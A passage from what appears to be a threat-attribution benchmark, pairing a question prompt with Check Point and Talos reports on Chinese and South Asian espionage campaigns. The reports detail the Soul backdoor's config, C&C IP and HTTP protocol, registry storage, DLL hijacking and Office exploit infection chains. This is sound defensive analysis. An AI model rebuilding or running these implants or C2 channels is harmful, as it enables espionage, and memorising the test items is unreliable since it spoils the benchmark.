among Chinese APT groups and is still used despite the exploitation of old patched vulnerabilities. This implies that at least a portion of the attacks using it are successful, and the threat actors are familiar with the cybersecurity practices of their targets.  Over the past several years, the C&C servers consistently return payloads only between 01:00 – 08:00 UTC Monday-Friday, which we believe represents the actors’ working hours.  The C&C servers did not return payloads during the period of the Chinese Spring Festival, even during working hours.  The victimology of the attacks is consistent with Chinese interests in Southeast Asian countries, particularly those with similar territorial claims or strategic infrastructure projects.  In addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a Chinese 114DNS Free Public DNS service which is not commonly used outside the region.    The campaign discussed in this report involves the malicious artifacts from different clusters of malware activity. As sharing custom tools or operational methods is common among Chinese-based threat actors to facilitate intrusion efforts, it poses a challenge to their attribution. In addition to observing different toolsets from two previously not connected clusters ([PLACEHOLDER] and previous attacks using the Soul framework), other areas of overlap between publicly tracked Chinese APT groups and this campaign include the following:    Infrastructure: One of the IP addresses used by [PLACEHOLDER]’s initial infection in late 2021 overlaps with the IP reportedly used by TAG-16 in the same timeframe. In the relevant report, the Insikt Group researchers provided evidence suggesting that TAG-16 shares custom capabilities with the People’s Liberation Army (PLA)-linked activity group RedFoxtrot.  The Southeast Asian government entity attacked in the described campaign was also targeted by a tool attributed to a Chinese-linked APT group during the same time period. However, there is currently no clear evidence to tie the tool to this campaign with high confidence.  Symantec researchers also discovered the APT30 toolset in the network of one of the organizations attacked with the Soul framework in the same timeframe, with no distinctive connection as well.  The vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the targets, and the capabilities of the toolset used lead us to the conclusion that the described activity is an espionage operation likely executed by well-resourced and possibly nation-state threat actors.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: In 2021, Check Point Research published a report on a previously undisclosed toolset used by [PLACEHOLDER], a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic infrastructure projects such as Vietnam, Thailand, and Indonesia.    Key findings:    In late 2022, a campaign with an initial infection vector similar to previous [PLACEHOLDER] operations targeted a high-profile government entity in the region.  While [PLACEHOLDER]’s previous campaigns delivered a custom and unique backdoor called VictoryDll, the payload in this specific attack is a new version of SoulSearcher loader, which eventually loads the Soul modular framework. Although samples of this framework from 2017-2021 were previously analyzed, this report is the most extensive look yet at the Soul malware family infection chain, including a full technical analysis of the latest version, compiled in late 2022.  Although the Soul malware framework was previously seen in an espionage campaign targeting the defense, healthcare, and ICT sectors in Southeast Asia, it was never previously attributed or connected to any known cluster of malicious activity. Although it is currently not clear if the Soul framework is utilized by a single threat actor, based on our research we can attribute the framework to an APT group with Chinese origins.  The connection between the tools and TTPs (Tactics, Techniques and Procedures) of [PLACEHOLDER] and the previously mentioned attacks in Southeast Asia might serve as yet another example of key characteristics inherent to Chinese-based APT operations, such as sharing custom tools between groups or task specialization, when one entity is responsible for the initial infection and another one performs the actual intelligence gathering.  Introduction  At the beginning of 2021, Check Point Research identified an ongoing surveillance operation we named [PLACEHOLDER] that was targeting Southeast Asian government entities. The attackers used spear-phishing emails to gain initial access to the targeted networks. These emails typically contained a Word document with government-themed lures that leveraged a remote template to download and run a malicious RTF document, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of in-memory loaders, comprised of a custom DLL downloader we call 5.t Downloader and a second-stage loader responsible for the delivery of a final backdoor. The final payload observed in [PLACEHOLDER] campaigns at the time was VictoryDll, a custom and unique malware that enabled remote access and data collection from the infected device. We tracked several earlier versions of the VictoryDll backdoor back to at least 2017, with the whole operation remaining under the radar the entire time.    Further tracking of [PLACEHOLDER] tools revealed multiple campaigns that targeted entities in Southeast Asian countries, such as Vietnam, Indonesia, and Thailand. During this time, multiple minor changes were implemented in the 5.t Downloader itself, but in general, the initial part of the infection chain (the use of Word documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023, when investigating an attack against one of the government entities located in the targeted region, the payload received from the actor’s geo-fenced C&C server was different from the VictoryDll backdoor observed before. Further analysis revealed that this payload is a new version of SoulSearcher loader, which is responsible for downloading, decrypting, and loading in memory other modules of the Soul modular backdoor.    Figure 1 - The infection chain.  Figure 1 – The infection chain.  The use of the Soul malware framework was described by Symantec in relation to the unattributed espionage operation targeting defense, healthcare, and ICT sectors in Southeast Asia in 2020-2021. Following up on that report, Fortinet researchers discovered other samples from 2017-2021 and described the evolution of the framework. Soul was also seen in 2019 in attacks against Vietnamese targets. None of these public reports attributed the Soul framework to any specific country or known actor, although researchers noted the “competent adversarial tradecraft” which they believed indicated a “possibly state-sponsored” group.    In this report, we provide a detailed technical explanation of several malicious stages used in this infection chain and the latest changes implemented in the Soul framework. We also discuss the challenges in attributing these attacks.    Downloader  The downloader, which in this specific case was dropped by RoyalRoad RTF to the disk as res6.a, is executed by a scheduled task with rundll32.exe, StartA. Its functionality is consistent with previous research of [PLACEHOLDER] activity. Similar to previous [PLACEHOLDER] campaigns, the C&C servers of the attackers are geofenced and return payloads only to requests from the IP addresses of the countries where the targets are located.    In the latest campaign, the actors implemented some changes in the downloader’s communication with the C&C. Previously, the entire C&C communication was based on sending data encrypted using RC4 and encoded with base64, with an exception for the HTTP request for payload which contained the hostname in plain text in the URI: /[**hostname]**.html.    However, in the new samples, the payload request is issued to the same PHP path as all the previous requests, with the host specified in its parameter, both MD5-hashed and in clear-text: [host_name]*[host_name_md5], e.g. MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4 and then encoded:    /[php_name].php?Data=[encoded<host_name_and_host_md5>]    It’s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained consistent in all cases.    In addition to changes in the URL patterns, the actors refrained from using the distinctive User-Agent “Microsoft Internet Explorer” and instead used a hardcoded generic one. A few of the samples we observed also communicated through HTTPS, not HTTP. Unlike the previous version where only the API calls were obfuscated, the new version also uses string encryption. However, the encryption is quite simple and consists of loop XORing an encrypted character with the difference of a loop index and a constant value:    Figure 2 - String decryption routine in the newest version of 5.t Downloader.  Figure 2 – String decryption routine in the newest version of 5.t Downloader.  As in previous versions, the downloader gathers data from the victim’s computer including hostname, OS name and version, system type (32/64 bit), username, MAC addresses of the networking adapters, and information on anti-virus solutions. If the threat actors find the victim’s machine to be a promising target, the response from the server contains the next stage executable in encrypted form and its MD5 checksum. After verifying the integrity of the received message, the downloader loads the decrypted DLL to memory and starts its execution from the StartW export function (the same name as the next stage loader export in previous campaigns that used the downloader).    SoulSearcher loader  SoulSearcher is a second-stage loader, which according to Fortinet research was seen in the wild since at least November 2018 and is responsible for executing the Soul backdoor main module and parsing its configuration. SoulSearcher has multiple variants based on where the configuration and payload are located and on the type of configuration. Among the samples used in the more recent activity cluster we have been researching, the SoulSearcher DLL (sha256: d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly different from any previously discovered samples, with the backdoor embedded inside the data section and the embedded configuration in XML format.    The malware checks if it runs under a process named svchost.exe, msdtc.exe or spoolsv.exe. If it does, it starts a thread on StartW export and continues loading the backdoor. This might be an indication of the loader being used in different infection chains than we observed in this attack with the rundll32.exe directly starting a chain of in-memory DLL loaders from StartW.    The payload loading process starts with obtaining the configuration. While previously seen XML SoulSearchers retrieved this from the registry, a file mapping object, or a file on the disk, the newest version loads the config from a hardcoded Base64 string and stores it in the registry path HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\CONFIGEX. The decoded data blob can be represented with the following struct:    struct compressed_data  {    DWORD magic;    DWORD unused;    BYTE lzma_properties[5];    DWORD size;    DWORD compressed_size;    BYTE decompressed_data_MD5[33];    BYTE compressed_data_MD5[33];    BYTE compressed_data[];  };  The loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous samples stored it in the overlay.    Next, based on the system architecture, SoulSearcher appends 32 or 64 to the wide string L'ServerBase', hashes the resulting string with MD5, and creates the registry key with this hash: HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies\[ServerBaseArch_md5]. The value contains the compressed payload.    If the registry key is successfully created, the loader reads the compressed payload and proceeds to decrypt and load it in memory. The loading process itself is not different from previously discussed variants of SoulSearcher: it uses the compressed_data structure from the configuration to validate MD5 checksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL in memory.    After loading the backdoor, Soul Searcher resolves the Construct export of the backdoor and calls it with the arguments [ServerBaseArch_md5] -Startup.    Soul Backdoor (main module)  The Soul main module is responsible for communicating with the C&C server and its primary purpose is to receive and load in memory additional modules. Interestingly, the backdoor configuration contains a “radio silence”-like feature, where the actors can specify specific hours in a week when the backdoor is not allowed to communicate with the C&C server.    The recovered sample of the backdoor is quite different from the samples that were previously analyzed. The new version of SoulBackdoor was compiled on 29/11/2022 02:12:34 UTC. Based on their timestamps, the earlier samples analyzed by other researchers are mostly from 2017 with the exception of one from 2018, which, similar to our case, was embedded inside the SoulSearcher loader.    The backdoor implements a custom C&C protocol, which is entirely different than previously observed versions. Both the old and new versions are based on HTTP communication, but the latest version seems to be more complex and uses various HTTP request methods such as GET, POST, and DELETE. The API endpoints are also different, and the C&C requests contain additional HTTP request headers. In terms of the backdoor functionality, the enumeration data is different from the previous versions and is more extensive. The supported C&C commands, with the newer variant primarily focused on loading additional modules, lack any type of common backdoor functionality like manipulating local files, sending files to the C&C, and executing remote commands.    Configuration and execution flow  The backdoor requires two arguments or the “-v” argument before performing its activity. As we mentioned earlier, in our case it is executed by SoulSearcher with [ServerBaseArch_md5] -Startup arguments.    Soul backdoor first creates an event using the hardcoded name Global\3GS7JR4S and checks the registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF. It then uses the same configuration (from the registry key HKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\CONFIGEX) with the compressed_data struct (as used by SoulSearcher) to extract the payload and decompress its own configuration. The configuration of the main module provides the parameters of C&C communication and other aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in older variants. After decompression, the config looks like this:    <CONFIG FLAG="X6bmLMbAL29AlxB">    <BASE>      <Ip>http://103.159.132.96/index.php</Ip>      <Dns>8.8.8.8|114.114.114.114|</Dns>      <Proxy></Proxy>      <CntPort>80|443</CntPort>      <LstPort>0</LstPort>      <Blog>NULL</Blog>      <DropboxBlog>NULL</DropboxBlog>      <HTTPS>false</HTTPS>    </BASE>    <SVC>      <SvcName>IKEEXT</SvcName>      <SvcDisp>@%SystemRoot%\system32\ikeext.dll,-501</SvcDisp>      <SvcDesc>@%SystemRoot%\system32\ikeext.dll,-502</SvcDesc>      <SvcDll>wlbsctrl.dll</SvcDll>    </SVC>    <ADV>      <OlPass>NULL</OlPass>      <OlTime>1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;</OlTime>      <SelfDestroy>2029-07-11 15:29:32</SelfDestroy>    </ADV>  </CONFIG>  In its base (<BASE>) settings, the configuration contains the parameter “LstPort”. In the previous versions, this provided the backdoor the ability to listen on a specified port. In this version, the code that supported this feature was removed, and the backdoor can only actively connect to the C&C server using the URL provided in the “IP” parameter on the “connect” port “Cnt”.    In the “advanced” section (<ADV>) of the configuration, the “OlTime” parameter contains a list of 168 (24×7) numbers, one per hour in a week. Each hour is represented either by 0 or 1. Zero means a “blocked” hour, and one represents an “allowed” hour. This way the operators of the malware can use the configuration to enforce the specific hours the backdoor is allowed to communicate with the C&C server. If the OlTime field is empty in the config, a default setting is for all days and hours to be configured as “allowed”. This is an advanced OpSec feature that allows the actors to blend their communication flow into general traffic and decrease the chances of network communication being detected. The “service” (<SVC>) section defines the parameters for the backdoor to be installed as a service:      <SVC>      <SvcName>IKEEXT</SvcName>      <SvcDisp>@%SystemRoot%\system32\ikeext.dll,-501</SvcDisp>      <SvcDesc>@%SystemRoot%\system32\ikeext.dll,-502</SvcDesc>      <SvcDll>wlbsctrl.dll</SvcDll>    </SVC>  The Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we analyzed, there is no code that implements this feature. Judging by the settings left in the configuration we observed, the actors performed some variation of IKEEXT DLL Hijacking, when on the start of the IKEEXT service, svchost.exe would load the malicious DLL, saved as wlbsctrl.dll.    After loading and parsing the configuration the backdoor checks the registry HKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\Assemblies for the existence of a key with the name of MD5 hash of the wide string L"AutoRun". If it exists, the backdoor decompresses, loads in memory, and executes the Construct export of the DLL stored in this key. Although we didn’t witness the creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing specific actions prior to the main backdoor activity.    After all of these steps are concluded, the backdoor begins the execution of its main thread.    C&C communication  The main thread begins by validating that it received from the configuration the C&C URL and DNS (or blog URL, which is empty in our case), and that the C&C URL starts with http://, https:// or ftp://. In this specific sample, we did not observe any type of FTP communication capabilities. Then, if the current hour is “allowed” by OlTime configuration, it begins the C&C communication.    Bot registration and victim fingerprinting    The first request is sent to the specified URL with the ClientHello parameter. The MD5 header is an MD5 hash of the body. As there is no data transferred by this request, the MD5 (d41d8cd98f00b204e9800998ecf8427e) is of an empty string. In further analysis of the requests, we omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn’t change between the requests.    GET /index.php?ClientHello HTTP/1.1  Cache-Control: no-cache  Connection: Keep-Alive  User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)  MD5: d41d8cd98f00b204e9800998ecf8427e  Content-Length: 0  Host: 103.159.132.96  The expected response from the C&C server is ERR! ParamError! In case of a bad or no response, the backdoor attempts to resolve the IP address of the C&C server on its own through the DNS servers in the config.    Figure 3 - C&C DNS resolution  Figure 3 – C&C DNS resolution  If the response is correct, it saves the C&C IP address in this format: SVR:[IP_field_from_config]:[CntPort] to the registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\SVIF.    Next, the module performs a full system enumeration and collects the following data:    Processor name and the number of processors, total physical memory and total available physical memory, and information about the hard disk such as total space and free space.  The OS architecture and various information from the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion registry key such as ProductName, CSDVersion, ProductId, RegisteredOwner, RegisteredOrganization etc.  Computer name and information about the current user, such as admin rights retrieved with NetUserGetInfo API.  Time zone information from both HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation and HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zones registry.  Local IP address of the machine, and its public IP address, obtained by issuing a request to one of the public IP resolution services such as https://www.whatismyip.com/:  Figure 4 - Victim machine enumeration data string  Figure 4 – Victim machine enumeration data string  After the system enumeration, the backdoor generates a botUUID, concatenating with “-” two MD5 strings based on various parameters from the enumerated data. It saves the botUUID to the registry key HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\UUID. The resulting botUUID looks like this:    5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7    and is used in all the following network requests.    New C&C connection    After the system enumeration, the backdoor issues a series of requests to “register” a new connection and perform validation against the C&C server.    First, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID:    DELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1  The accepted response from the C&C: OK!    Next, the Connect request is sent, whose body contained Base64 of the string ConnectXXXXXXXX, where XXXXXXXX is the connection timestamp retrieved by GetTickCount() API.    POST /index.php?[botUUID]/REQ.dat HTTP/1.1  [Base64-encoded string]  The accepted response from the C&C: OK!    The following request prepares the server to receive the enumeration data from the victim’s machine:    GET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1  The accepted response from the C&C is a string that looks like this: ./Updata/[botUUID]_[connection_timestamp].txt.    This is most likely the path on the server to store the enumeration data.    After this the backdoor sends another network request, possibly for verification:    GET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1  The accepted response is a base64-encoded string that contains the botUUID.    At the end of this process, if all the requests are successful, the backdoor is “registered” at the C&C server and continues sending information about the system.    Send enumerated data    From this point on, the data sent between the backdoor and the C&C server relies on another struct, c2_body:    struct c2_body  {    DWORD special_flag;    DWORD additional_data;    DWORD const_float;    BYTE command_id;  };  const_float, where used, is a hardcoded value, 5.2509999. special_flag and additional_data seem to be multipurpose variables that have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct is compressed according to the previously described compressed_data struct from SoulSearcher, and then encoded with Base64.    First, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved by GetTickCount() API).    POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1  [base64-encoded and compressed c2_body]  In this request, special_flag is 0x00, command_id is 0x01 and additonal_data is the tick count. The accepted response is OK! Otherwise, the backdoor sleeps and starts the connection from the beginning.    Next, the backdoor collects the enumeration data again, and compresses it using another struct:    struct enum_compressed_data  {    c2_body c2_msg;    compressed_data enum_data;  };  The struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same):    POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1  [base64-encoded and compressed enum_compressed_data]  The command_id is the same 0x01, special_flag=0, additional_data= 0x4000 + 0x49 = size of enum data.    The accepted response is also OK!    Main C&C loop    After posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with the following request to receive the commands:    GET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_* HTTP/1.1  If there is no C&C command for the victim, the server responds with ERR! Path not found, WAIT!    If there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed with compressed_data and parsed as c2_body. Then the command_id from the struct is translated to the actual command execution.    Soul Backdoor Commands  The main commands that can be received from the C&C server are control messages for the bot:    Command ID Action Description  0x04 Execute command Create a thread that handles commands from the second set of commands.  0x0D Client keep-alive Mirror the request from the C&C server.  0x0E Restart C&C session Send DELETE request and restart the communication from client Hello.  0x0F Exit Send DELETE request and exit process forcefully.  If in the c2_body the special_flag is set to one, the backdoor starts a continuous loop requesting data from the C&C server. The server should respond with a module name to be loaded from the Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies registry key, which is executed from its Construct export. Then the backdoor proceeds to execute the command specified in command_id.    If the command_id is 0x04, the backdoor spawns a new “command execution” thread that performs a similar network communication flow as the main thread, only without sending the enumeration data.    It then begins handling the following commands:    Command ID Action Description  0xF Exit thread If the command_flag is on stop, exit the “command execution” thread. Otherwise do nothing  0x61 Install modules The server sends the number of modules to be written to the registry. Then the bot makes requests to the C&C server, once per module and writes it to a specified registry key. Validate the result by executing command 0x65 afterward.  All the registry keys are under Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies.  0x62 Delete modules Delete registry keys that are sent by the C&C in a string separated by semi-colons (;). Validate the result by executing command 0x65 afterward.  0x63 Validate modules Validate that modules are currently compatible with the system architecture. The modules are located in the registry, and registry keys names are sent by the C&C separated by a semi-colon.  0x64 Load module Load the specified module and call its export function Construct. The registry key where the module is stored is sent by the C&C server.  0x65 Enumerate modules Create a buffer with all registry keys under Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies in the format of %s:%f:; (key name and first 4 bytes of the value), then send the buffer back to the C&C.  All the received modules are stored compressed in the registry. The decompression is performed according to another struct:    struct stored_module  {    float version_or_id;    QWORD decompressed_size;    QWORD compressed_size;    BYTE md5sum[33];    BYTE compressed_data[];  };  We didn’t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset.    Attribution  As the first stages of the infection chain are identical to the previously described [PLACEHOLDER] activity, many of the indicators that allowed us to attribute the threat actors to Chinese-based threat groups are still relevant in relation to the subsequent attack attempts described in this report:    The RoyalRoad RTF kit was reported as the tool of choice among Chinese APT groups and is still used despite the exploitation of old patched vulnerabilities. This implies that at least a portion of the attacks using it are successful, and the threat actors are familiar with the cybersecurity practices of their targets.  Over the past several years, the C&C servers consistently return payloads only between 01:00 – 08:00 UTC Monday-Friday, which we believe represents the actors’ working hours.  The C&C servers did not return payloads during the period of the Chinese Spring Festival, even during working hours.  The victimology of the attacks is consistent with Chinese interests in Southeast Asian countries, particularly those with similar territorial claims or strategic infrastructure projects.  In addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a Chinese 114DNS Free Public DNS service which is not commonly used outside the region.    The campaign discussed in this report involves the malicious artifacts from different clusters of malware activity. As sharing custom tools or operational methods is common among Chinese-based threat actors to facilitate intrusion efforts, it poses a challenge to their attribution. In addition to observing different toolsets from two previously not connected clusters ([PLACEHOLDER] and previous attacks using the Soul framework), other areas of overlap between publicly tracked Chinese APT groups and this campaign include the following:    Infrastructure: One of the IP addresses used by [PLACEHOLDER]’s initial infection in late 2021 overlaps with the IP reportedly used by TAG-16 in the same timeframe. In the relevant report, the Insikt Group researchers provided evidence suggesting that TAG-16 shares custom capabilities with the People’s Liberation Army (PLA)-linked activity group RedFoxtrot.  The Southeast Asian government entity attacked in the described campaign was also targeted by a tool attributed to a Chinese-linked APT group during the same time period. However, there is currently no clear evidence to tie the tool to this campaign with high confidence.  Symantec researchers also discovered the APT30 toolset in the network of one of the organizations attacked with the Soul framework in the same timeframe, with no distinctive connection as well.  The vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the targets, and the capabilities of the toolset used lead us to the conclusion that the described activity is an espionage operation likely executed by well-resourced and possibly nation-state threat actors.
https://blog.talosintelligence.com/bitter-apt-adds-bangladesh-to-their/	Cisco Talos discovered an ongoing campaign operated by what we believe is the [PLACEHOLDER] APT group since August 2021. This campaign is a typical example of the actor targeting South Asian government entities.    This campaign targets an elite unit of the Bangladesh's government with a themed lure document alleging to relate to the regular operational tasks in the victim's organization. The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB). The emails contain either a malicious RTF document or a Microsoft Excel spreadsheet weaponized to exploit known vulnerabilities. Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine. The trojan masquerades as a Windows Security update service and allows the malicious actor to perform remote code execution, opening the door to other activities by installing other tools. In this campaign, the trojan runs itself but the actor has other RATs and downloaders in their arsenal.    Such surveillance campaigns could allow the threat actors to access the organization's confidential information and give their handlers an advantage over their competitors, regardless of whether they're state-sponsored.    [PLACEHOLDER] threat actor  [PLACEHOLDER] is a suspected South Asian threat actor. They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia. In their latest campaign, they have extended their targeting to Bangladeshi government entities.    [PLACEHOLDER] is mainly motivated by espionage. The adversary typically downloads malware onto compromised endpoints from their hosting server via HTTP and uses DNS to establish contact with the command and control. [PLACEHOLDER]  is known for exploiting known vulnerabilities in victims' environments. For example, in 2021, security researchers discovered that the adversary was exploiting the zero-day vulnerability CVE-2021-28310, a security flaw in Microsoft's Desktop Manager. [PLACEHOLDER] is known to target both mobile and desktop platforms. Their arsenal mainly contains [PLACEHOLDER] RAT, Artra downloader, SlideRAT and AndroRAT.    Infrastructure  The actor's infrastructure consists of the C2 server (helpdesk[.]autodefragapp[.]com) and several domains that host the adversary's malware, which is outlined below.      Domains hosting [PLACEHOLDER] APT malware.  The SSL thumbprints are unique for each domain's certificate. We compiled a list of these SSL thumbprints in the IOCs section of the report. The timeline below shows the various domains based on their certificate creation date.      The C2 host is helpdesk[.]autodefragapp[.]com. Its WhoIs record indicates that the domain autodefragapp[.]com registered it in November 2020, and later updated it on Nov. 3, 2021. We have seen the actor use this C2 in previous campaigns.    The C2 domain resolved to 99[.]83[.]154[.]118 during the period of the campaign. This is a legitimate IP address for the AWS Global Accelerator networking service. Usually, the AWS Global Accelerator provides static IPs to the registrant, which allows the user to redirect traffic to their application or host for improved performance. In this case, we believe that the actor is using the AWS Global Accelerator to redirect traffic to their actual C2 host, which is parked behind the legitimate AWS service. We believe that the actor has employed this technique to conceal their identity.    Attribution  We assess with moderate confidence that this campaign is operated by [PLACEHOLDER] based on the use of the same C2 IP address from previous campaigns and similarities in the decrypted strings of the payload, such as module names, payload executable name, paths and the constants.      The 99[.]83[.]154[.]118 IP also hosts mswsceventlog[.]net, according to Cisco Umbrella, a domain that was previously reported as [PLACEHOLDER]'s C2 server in a campaign against Pakistani government organizations.    The campaign  Cisco Talos observed an ongoing campaign operated by the [PLACEHOLDER] APT group since August 2021 targeting Bangladeshi government personnel with spear-phishing emails. The email contains a maldoc attachment and masquerades as a legitimate email. The sender asks the target to review or verify the attached maldoc, which is either a call data record (CDR), a list of phone numbers, or a list of registered cases. We have seen the actor use these themes in phishing emails in the past.    The maldocs are an RTF document and Microsoft Excel spreadsheets. Examples of the specific subjects of the phishing emails are below.    Subject: CDR  Subject: Application for CDR  Subject: List of Numbers to be verified  Subject: List of registered cases  The maldocs' file names are consistent with the phishing emails' themes, as seen in the list of file names below:    Passport Fee Dues.xlsx  List of Numbers to be verified.xlsx  ASP AVIJIT DAS.doc  Addl SP Hafizur Rahman.doc  Addl SP Hafizur Rahman.xlsx  Registered Cases List.xlsx  Below are two spear-phishing email samples of this campaign.      Phishing email sample 1    Phishing email sample 2  The actor is using JavaMail with the Zimbra web client version 8.8.15_GA_4101 to send the emails. Zimbra is a collaborative software suite that includes an email server and a web client for messaging.      Phishing email header information.  The originating IP address and header information indicates the emails were sent from mail servers based in Pakistan and the actor spoofed the sender details to make the email appear as though it was sent from Pakistani government organizations. The actor exploited a possible vulnerability in the Zimbra mail server. By modifying the Zimbra mail server configuration file, a user can send emails from a non-existing email account/domain. We have compiled a list of fake sender email addresses from this campaign:    cdrrab13bd@gmail[.]com  arc@desto[.]gov[.]pk  so.dc@pc[.]gov[.]pk  mem_psd@pc[.]gov[.]pk  chief_pia@pc[.]gov[.]pk  rab3tikatuly@gmail[.]com  ddscm2@pof[.]gov[.]pk  The infection chain  The infection chain begins with the spear-phishing email and either a malicious RTF document or an Excel spreadsheet attachment. When the victim opens the attachment, it launches the Microsoft Equation Editor application to execute the equations in the form of OLE objects and connects to the hosting server to download and run the payload.      Malicious RTF infection chain summary.  In the case of a malicious Excel spreadsheet, when the victim opens the file, it launches the Microsoft Equation Editor application to execute the embedded equation object and launches the task scheduler to configure two scheduled tasks. One of the scheduled tasks downloads the trojan "ZxxZ" into the public user's account space, while the other task runs the "ZxxZ".      Malicious Excel infection chain summary.  The payload runs as a Windows security update service on the victim's machine and establishes communication with the C2 to remotely download and execute files in the victim's environment.    RTF document  The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office. Our previous blog outlines how this particular exploit works in the victim's environment.      Malicious RTF document sample.  The RTF document is embedded with an OLE object with the class name "Equation 3.0." It contains the shellcode as an equation formula created using Microsoft Equation Editor.      Embedded Microsoft Equation object.  When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets. The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx. The payload is downloaded in the folder "C:\$Utf" created by the shellcode and runs as a process on the victim's machine.      Download URL captured during runtime of the maldoc.  Excel spreadsheet  The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802.    When the victim opens the Excel spreadsheet, it launches the Microsoft Equation Editor application to execute the embedded Microsoft Equation 3.0 objects.      Malicious Excel spreadsheet.  Once the Microsoft Equation Editor service executes the embedded objects, it invokes the scheduled task service to configure the task scheduler with the commands shown below:    Task 1: Rdx      Task 2: RdxFac      The actor creates the folder "RdxFact '' in the Windows tasks folder and schedules two tasks with the task names "Rdx '' and "RdxFac '' to run every five minutes. When the first task runs, the victim's machine attempts to connect to the hosting server through the URL and, using the cURL utility, downloads the "RdxFactory.exe" into the public user profile's music folder. RdxFactory.exe is the trojan downloader.    After five minutes of execution of the first task, "Rdx,", the second task, "RdxFac,"runs to start the payload.    Based on other related samples we discovered, the actor also uses different folder names, tasks names and dropper file names in their campaigns.      We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment. Systems running Windows 10 and later have the cURL utility, which the actor abuses in this campaign.    The payload  The payload is a 32-bit Windows executable compiled in Visual C++ with a timestamp of Sept. 10, 2021. We named the trojan "ZxxZ" based on the name of a separator that the payload uses while sending information to the C2. This trojan is a downloader that downloads and executes the remote file. The executables were seen with the filenames "Update.exe", "ntfsc.exe" or "nx" in this campaign. They are either downloaded or dropped into the victim's "local application data" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.    The actor uses common encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tools.      WinMain function snippet.  The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an array that will be returned to the caller function.      Decryption function.  The malware searches for the Windows Defender and Kaspersky antivirus processes in the victim's machine by creating the snapshot of running processes using 